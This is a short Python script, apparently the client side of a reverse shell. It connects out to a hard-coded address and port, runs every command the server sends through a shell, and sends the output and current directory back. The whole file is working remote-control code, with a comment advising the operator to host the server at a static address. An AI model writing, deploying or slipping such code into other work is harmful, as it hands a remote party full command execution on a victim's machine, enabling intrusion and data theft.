#!/usr/bin/env python3
import socket, subprocess, os


s = socket.socket()
# Upload the server.py to a server to have a static ip address. Otherwise change this every time.
host = '192.168.1.12'
PORT = 9999

s.connect((host, PORT))

# Allows multiple commands to be sent from the server.
while True:
	data = s.recv(1024)
	# Checks if the command is cd
	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8'))
	# Checks if the command is not a false enter(to avoid a crash of the program)
	if len(data) > 0:
		# Shows the commands the server enters on the clients terminal
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
		output_byte = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_byte, 'utf-8')
		currentWD = os.getcwd() + '> '
		# Sends the output of the client's terminal to the server.
		s.send(str.encode(output_str + currentWD))

		print(output_str)